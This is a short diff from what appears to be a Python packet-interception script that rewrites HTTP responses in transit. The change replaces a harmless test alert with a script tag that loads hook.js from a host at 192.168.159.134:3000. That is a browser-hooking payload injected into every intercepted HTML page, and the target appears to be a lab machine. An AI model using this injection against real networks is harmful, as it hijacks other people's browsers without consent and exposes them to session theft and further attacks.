@@ -26,7 +26,7 @@ def process_packet(pkt):
             print("[+] HTTP Response")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load.decode('utf-8', errors='ignore'))
             # (?:....) to locate the regrex keywords
-            injection_code = b"<script>alert('test')</script>"
+            injection_code = b'<script src="http://192.168.159.134:3000/hook.js"></script>'
             load = bytes(load.replace(b"<body>", b"<body>" + injection_code))
             if content_length_search and b"text/html" in load:
                 content_length = content_length_search.group(1)
